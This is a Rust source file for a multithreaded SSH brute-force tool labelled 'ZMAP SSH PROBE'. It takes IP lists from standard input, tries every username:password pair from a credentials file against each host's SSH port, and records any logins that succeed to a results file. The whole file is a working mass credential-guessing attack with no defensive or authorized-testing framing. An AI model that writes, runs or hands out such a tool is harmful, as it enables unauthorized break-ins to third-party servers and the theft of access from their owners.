use ssh2::Session;
use std::io::{self, BufRead, Write, BufWriter};
use std::fs::OpenOptions;
use std::net;
use std::sync::mpsc;
use threadpool::ThreadPool;
use std::thread;
use std::time::Duration;
use std::sync::atomic::{AtomicUsize, Ordering};
use colored::*; 
use clap::Parser;

static IMPORTED: AtomicUsize = AtomicUsize::new(0);
static CHECKED: AtomicUsize = AtomicUsize::new(0);
static COMBOS_CHECKED: AtomicUsize = AtomicUsize::new(0);
static SUCCESS: AtomicUsize = AtomicUsize::new(0);
static FAILED: AtomicUsize = AtomicUsize::new(0);
static TIMEOUTS: AtomicUsize = AtomicUsize::new(0);

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Specifies the SSH port
    #[arg(short = 'p', long, default_value = "22")]
    port: u16,

    /// Specifies the name of the output file
    #[arg(short = 'o', long, default_value = "results.txt")]
    output_file: String,

    /// Specifies the number of threads to use
    #[arg(short = 't', long, default_value = "50")]
    threads: usize,
}

fn main() {
    let args = Args::parse();

    let (ip_tx, ip_rx) = mpsc::channel();
   
    thread::spawn(|| {
        println!("+-------------------------------------------+");
        println!("|             ZMAP SSH PROBE                |");
        println!("+-------------------------------------------+");
        
        loop {
            thread::sleep(Duration::new(1, 0)); // Sleep for one second

            // Read the atomic values
            let imported_count = IMPORTED.load(Ordering::Relaxed);
            let checked_count = CHECKED.load(Ordering::Relaxed);
            let combos_checked_count = COMBOS_CHECKED.load(Ordering::Relaxed);
            let success_count = SUCCESS.load(Ordering::Relaxed);
            let failed_count = FAILED.load(Ordering::Relaxed);
            let timeouts_count = TIMEOUTS.load(Ordering::Relaxed);

            // Clear current line and print updated stats on one line
            print!("IPs Imported: {} | IPs Checked: {} | Combos Checked: {} | Successful: {} | Failed: {} | Timeouts: {} \n", 
                imported_count.to_string().blue(),
                checked_count.to_string().blue(),
                combos_checked_count.to_string().yellow(), 
                success_count.to_string().green(),
                failed_count.to_string().red(),
                timeouts_count.to_string().magenta()
            );

            io::stdout().flush().unwrap();
        }
    });

    std::thread::spawn(move || {
        let stdin = io::stdin();
        for line in stdin.lock().lines() {
            let ip = line.expect("Failed to read line");
            ip_tx.send(ip).unwrap();
            IMPORTED.fetch_add(1, Ordering::Relaxed);
        }
    });

    let credentials = load_credentials_file("credentials.txt");

    let pool = ThreadPool::new(args.threads);

    loop {
        match ip_rx.recv() {
            Ok(ip) => {
                let creds = credentials.clone();
                let output_file = args.output_file.clone();
    
                pool.execute(move || {
                    check_ssh_login(ip, args.port, creds, &output_file);
                });                                           
            }
            Err(_) => {
                // Channel is closed, no more IPs
                break;
            }
        }
    }
}

fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, output_file: &str) {
    let timeout = 5_000; // milliseconds
    CHECKED.fetch_add(1, Ordering::Relaxed);

    if let Ok(tcp_stream) = net::TcpStream::connect((ip.as_str(), port)) {
        let mut session = Session::new().unwrap();
        session.set_tcp_stream(tcp_stream);
        session.set_timeout(timeout);

        match session.handshake() {
            Ok(_) => {
                for (username, password) in &credentials {
                    match session.userauth_password(username, password) {
                        Ok(_) => {
                            session.disconnect(None, "Closing session", None).unwrap();
                            write_successful_login_to_file(output_file, &ip, username, password);
                            SUCCESS.fetch_add(1, Ordering::Relaxed);
                            break;
                        },
                        Err(e) => {
                            if e.to_string().contains("Unable to negotiate") {
                                // If the error message contains "Unable to negotiate", we treat it as a failed attempt
                                FAILED.fetch_add(1, Ordering::Relaxed);
                                break;
                            } else {
                                FAILED.fetch_add(1, Ordering::Relaxed);
                            }
                        }
                    }
                }
            },

            Err(e) => {
                if e.to_string().contains("timeout") {
                    TIMEOUTS.fetch_add(1, Ordering::Relaxed);
                } else {
                    // Handle other errors
                    FAILED.fetch_add(1, Ordering::Relaxed);
                }
            }            
        }
    } else {
        FAILED.fetch_add(1, Ordering::Relaxed);
    }
}

fn load_credentials_file(file_path: &str) -> Vec<(String, String)> {
    let file = std::fs::File::open(file_path).expect("Unable to open credentials file");
    let reader = std::io::BufReader::new(file);

    reader.lines().filter_map(|line| {
        let line = line.expect("Failed to read line from credentials file");
        let parts: Vec<&str> = line.split(':').collect();
        if parts.len() == 2 {
            Some((parts[0].to_string(), parts[1].to_string()))
        } else {
            None
        }
    }).collect()
}

fn write_successful_login_to_file(output_file: &str, ip: &str, username: &str, password: &str) {
    let file = OpenOptions::new()
        .write(true)
        .append(true)
        .create(true)
        .open(output_file)
        .unwrap();
    let mut file = BufWriter::new(file);
    
    writeln!(file, "IP: {}, Username: {}, Password: {}", ip, username, password).unwrap();
    file.flush().unwrap();
}

